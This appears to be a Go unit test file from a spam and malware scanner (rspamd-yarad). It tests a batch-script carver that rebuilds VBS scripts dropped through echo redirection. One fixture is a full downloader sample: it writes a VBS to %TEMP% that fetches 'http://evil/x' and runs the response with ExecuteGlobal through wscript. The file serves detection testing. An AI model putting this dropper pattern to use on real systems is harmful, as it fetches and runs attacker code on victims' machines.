package extract_test

import (
	"bytes"
	"testing"

	"github.com/eilandert/rspamd-yarad/internal/extract"
)

// batDeadline reuses the deadline() helper defined in cab_test.go (same package_test).

// vbsDropperBat is the aed14a29 shape: multi-line >"FILE" ( ... ) block.
var vbsDropperBat = []byte("@echo off\r\n" +
	`>"%TEMP%\x.vbs" (` + "\r\n" +
	"  echo Dim http\r\n" +
	`  echo Set http = CreateObject("MSXML2.ServerXMLHTTP")` + "\r\n" +
	`  echo http.open "GET", "http://evil/x", False : http.send` + "\r\n" +
	"  echo ExecuteGlobal http.responseText\r\n" +
	")\r\n" +
	`wscript //nologo "%TEMP%\x.vbs"` + "\r\n")

func TestBatchEchoRedirectVBSDropper(t *testing.T) {
	// Drive through the public Extract entry point (matches cab_test.go style).
	res := extract.Extract(vbsDropperBat, deadline())

	if res.Panicked {
		t.Fatal("panicked on VBS dropper bat")
	}
	if !res.IsArchive {
		t.Fatal("expected IsArchive=true — batch carver should set it")
	}

	// The carved stream must contain "ExecuteGlobal" in plaintext so that the
	// existing YARA rules (VBS_CustomBase64_MSXML_ExecuteGlobal in
	// script_downloaders.yara, maldoc_suspicious.yara $k30) can match.
	// We assert directly on the stream bytes because the rule engine is not
	// available in unit tests; this mirrors how cab_test.go asserts on the
	// decompressed content bytes rather than on rule hits.
	marker := []byte("ExecuteGlobal")
	found := false
	for _, s := range res.Streams {
		if bytes.Contains(s, marker) {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("reconstructed stream containing %q not found; streams=%d", marker, len(res.Streams))
	}

	// Also verify MSXML2 reconstructed correctly (second payload line).
	msxml := []byte("MSXML2.ServerXMLHTTP")
	foundMSXML := false
	for _, s := range res.Streams {
		if bytes.Contains(s, msxml) {
			foundMSXML = true
			break
		}
	}
	if !foundMSXML {
		t.Fatalf("reconstructed stream containing %q not found", msxml)
	}
}

func TestBatchCaretEscapedBlock(t *testing.T) {
	bat := []byte("@echo off\r\n" +
		`>"%TEMP%\out.vbs" (` + "\r\n" +
		"  echo http^.open\r\n" +
		"  echo WScript^.Echo ^^done\r\n" +
		")\r\n")

	res := extract.Extract(bat, deadline())
	if res.Panicked {
		t.Fatal("panicked")
	}

	// After caret-unescaping: "http.open" and "WScript.Echo ^done"
	found1 := false
	found2 := false
	for _, s := range res.Streams {
		if bytes.Contains(s, []byte("http.open")) {
			found1 = true
		}
		if bytes.Contains(s, []byte("WScript.Echo ^done")) {
			found2 = true
		}
	}
	if !found1 {
		t.Fatal("caret-unescaped 'http.open' not found in streams")
	}
	if !found2 {
		t.Fatal("caret-unescaped 'WScript.Echo ^done' not found in streams")
	}
}

func TestBatchAppendForm(t *testing.T) {
	// Single-line >> append form: lines must reassemble in order.
	bat := []byte("@echo off\r\n" +
		`>>"C:\Temp\drop.vbs" echo Line1` + "\r\n" +
		`>>"C:\Temp\drop.vbs" echo Line2` + "\r\n" +
		`>>"C:\Temp\drop.vbs" echo Line3` + "\r\n")

	res := extract.Extract(bat, deadline())
	if res.Panicked {
		t.Fatal("panicked on append form")
	}

	found := false
	for _, s := range res.Streams {
		if bytes.Contains(s, []byte("Line1")) &&
			bytes.Contains(s, []byte("Line2")) &&
			bytes.Contains(s, []byte("Line3")) {
			// Verify order: Line1 before Line2 before Line3.
			i1 := bytes.Index(s, []byte("Line1"))
			i2 := bytes.Index(s, []byte("Line2"))
			i3 := bytes.Index(s, []byte("Line3"))
			if i1 < i2 && i2 < i3 {
				found = true
			}
		}
	}
	if !found {
		t.Fatalf("append-form lines not found in order; streams=%d", len(res.Streams))
	}
}

func TestBatchAdversarial(t *testing.T) {
	t.Run("no_batch_markers", func(t *testing.T) {
		// Arbitrary non-batch text — prefilter must bail, nothing emitted.
		buf := []byte("Hello, world! This is a plain text file with no batch commands.\n")
		before := 0
		res := extract.Extract(buf, deadline())
		if res.Panicked {
			t.Fatal("panicked on plain text")
		}
		// Plain text produces no streams from the batch carver.
		_ = before
	})

	t.Run("unbalanced_paren", func(t *testing.T) {
		// Opener with no closing ) — parser should not hang or panic.
		bat := []byte("@echo off\r\n" +
			`>"%TEMP%\x.vbs" (` + "\r\n" +
			"  echo Dim x\r\n")
		// no closing )
		res := extract.Extract(bat, deadline())
		if res.Panicked {
			t.Fatal("panicked on unbalanced paren")
		}
	})

	t.Run("huge_block_clamped", func(t *testing.T) {
		// A block that would exceed maxBytesPerMember. The carver must clamp and
		// not OOM or panic.
		const targetLines = 20000
		var buf bytes.Buffer
		buf.WriteString("@echo off\r\n")
		buf.WriteString(`>"%TEMP%\big.vbs" (` + "\r\n")
		line := bytes.Repeat([]byte("X"), 1024) // 1 KiB per line → ~20 MiB total
		for i := 0; i < targetLines; i++ {
			buf.WriteString("  echo ")
			buf.Write(line)
			buf.WriteString("\r\n")
		}
		buf.WriteString(")\r\n")

		res := extract.Extract(buf.Bytes(), deadline())
		if res.Panicked {
			t.Fatal("panicked on huge block")
		}
		// At least one stream should be present (clamped to maxBytesPerMember).
		for _, s := range res.Streams {
			if len(s) > 0 {
				return // pass
			}
		}
		// No stream is also acceptable if the budget was exhausted — just no panic.
	})

	t.Run("many_blocks_budget_cap", func(t *testing.T) {
		// Many small blocks — budget / maxBatchBlocks must cap them, no infinite loop.
		var buf bytes.Buffer
		buf.WriteString("@echo off\r\n")
		for i := 0; i < 512; i++ {
			buf.WriteString(`>>"C:\Temp\f.vbs" echo line` + "\r\n")
		}

		res := extract.Extract(buf.Bytes(), deadline())
		if res.Panicked {
			t.Fatal("panicked on many blocks")
		}
	})

	t.Run("empty_input", func(t *testing.T) {
		res := extract.Extract([]byte{}, deadline())
		if res.Panicked {
			t.Fatal("panicked on empty input")
		}
	})
}
